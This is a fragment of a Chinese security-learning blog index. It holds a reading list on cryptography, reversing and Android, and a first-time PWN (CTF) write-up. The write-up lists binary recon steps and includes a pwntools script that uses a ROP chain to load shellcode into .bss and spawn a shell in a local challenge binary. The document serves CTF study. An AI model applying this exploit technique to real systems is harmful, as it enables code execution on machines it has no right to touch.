        <content type="html"><![CDATA[<h1 id="GTD-amp-每周书单"><a href="#GTD-amp-每周书单" class="headerlink" title="GTD&amp;每周书单"></a>GTD&amp;每周书单</h1><p>零散的GTD不方便随时查看和添加修改，因此开辟一个总的模块，综合记录学习安全时的GTD清单🧾</p><ul><li><p><a href="https://github.com/xuanhun/PythonHackingBook1" target="_blank" rel="noopener">Python黑客编程</a><br>包含web、逆向等方面的，基本功，要熟练</p></li><li><p><a href="https://www.icourse163.org/course/0809NJU008-1001625001" target="_blank" rel="noopener"> CSAPP南大慕课</a>，袁春风老师<br>偶然发现CSAPP这本书有学校开了慕课，非常惊喜，可以结合着书一起看。这本书对于丰富理论基础非常帮助。</p></li><li><p>社工的学习，详见笔记：安全综合-【社会工程学】</p></li><li><p>汇编学习，坚实基础，<a href="https://www.kanxue.com/book-section_list-31.htm" target="_blank" rel="noopener">看雪的教程</a></p></li><li><p>电大，现代密码学幕课，<a href="https://www.icourse163.org/course/UESTC-1003046001" target="_blank" rel="noopener">链接</a></p></li></ul><h1 id="书单（每周更新）"><a href="#书单（每周更新）" class="headerlink" title="书单（每周更新）"></a>书单（每周更新）</h1><h2 id="Past"><a href="#Past" class="headerlink" title="Past"></a>Past</h2><ol><li>《密码学与网络安全》，教材，结合公开课看 -&gt; 到期末</li><li>《HTTP权威指南》，结合TCP/IP权威指南一样看，协议基础很重要 -&gt; 2周</li><li>《加密与解密》恶意软件分析，逆向基础 -&gt; 长期<br>——————10/12/2019</li><li>《软件保护及分析技术——原理与实践》by 章立春<br>📒简单易懂得介绍/罗列了软件保护常用的技术，比较通俗易懂，适合概念入门，最后有自己动手构建保护器的内容。</li><li>《Java设计模式及实践》卡马尔米特·辛格（Kamalmeet Singh）<br>通俗，有实例结合。便于入门，但中文翻译质量一言难尽。</li></ol><h2 id="30-12-2019—1-5-2020"><a href="#30-12-2019—1-5-2020" class="headerlink" title="30/12/2019—1/5/2020"></a>30/12/2019—1/5/2020</h2><ol><li>《乌合之众·大众心理学研究》[法]古斯塔夫·勒庞<br>❌[未完成]</li></ol><h2 id="12-1-2020—20-1-2020"><a href="#12-1-2020—20-1-2020" class="headerlink" title="12/1/2020—20/1/2020"></a>12/1/2020—20/1/2020</h2><ol><li>《第一行代码》前7章，涉及系统的方面仔细看</li><li>《Android编程权威指南》当工具书一样看，同样关注Android系统架构与基本源文件架构</li><li>《逆向分析实战》，冀云。比较基础，快速翻看一下</li></ol><h2 id="长期书目"><a href="#长期书目" class="headerlink" title="长期书目"></a>长期书目</h2><ol start="0"><li>《密码学与网络安全》，密码学教材，结合公开课看 </li><li>《一个64位操作系统的设计与实现》 ，田宇。</li><li>《加密与解密》恶意软件分析，软件逆向</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> GTD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【PWN】第一次做PWN题的一些总结</title>
      <link href="/2019/09/19//articles/2019/09/19/1568825389736.html/"/>
      <url>/2019/09/19//articles/2019/09/19/1568825389736.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一些步骤总结"><a href="#一些步骤总结" class="headerlink" title="一些步骤总结"></a>一些步骤总结</h1><p>第一次做PWN题，实际操作，感觉还是挺有趣的，虽然也有些套路的性质</p><ul><li><p>file proc</p><ul><li>看程序的位数，是否为动态链接</li></ul></li><li><p>chmod 777 proc &amp; ./proc</p><ul><li>运行程序，观察程序的输入输出特征，以及字符串，便于定位</li></ul></li></ul><ul><li>checksec proc<ul><li>看程序的保护机制，针对不同的保护机制设计不同的攻击思路和绕过方法</li></ul></li></ul><ul><li><p>gdb ./proc</p><ul><li>cyclic 100，直接start contin 输入，看返回地址泄漏</li></ul></li></ul><ul><li><p>objdump -R ./proc</p></li><li><p>objdump -D ./proc</p><ul><li>看反汇编代码</li></ul></li></ul><ul><li><p>IDA查看反汇编伪C代码  </p></li><li><p>exp编写示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Settings at first</span></span><br><span class="line"></span><br><span class="line">bss_addr =  <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">proc =  <span class="string">'./static'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Using binary to automatically set context</span></span><br><span class="line"></span><br><span class="line">context.binary = proc</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate shelllcode</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive with proc</span></span><br><span class="line"></span><br><span class="line">p = process(proc)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to zsctf!'</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># In this example, we use rop to exploit</span></span><br><span class="line"></span><br><span class="line">rop = ROP(proc)</span><br><span class="line"></span><br><span class="line"><span class="comment">## To read(), args 0 means standard input</span></span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>, bss_addr +  <span class="number">0x100</span>, len(shellcode))</span><br><span class="line"></span><br><span class="line">rop.call(bss_addr +  <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">## When this statement excute, turn to read(), waiting for inputs</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">20</span>  +  str(rop))</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive with proc</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
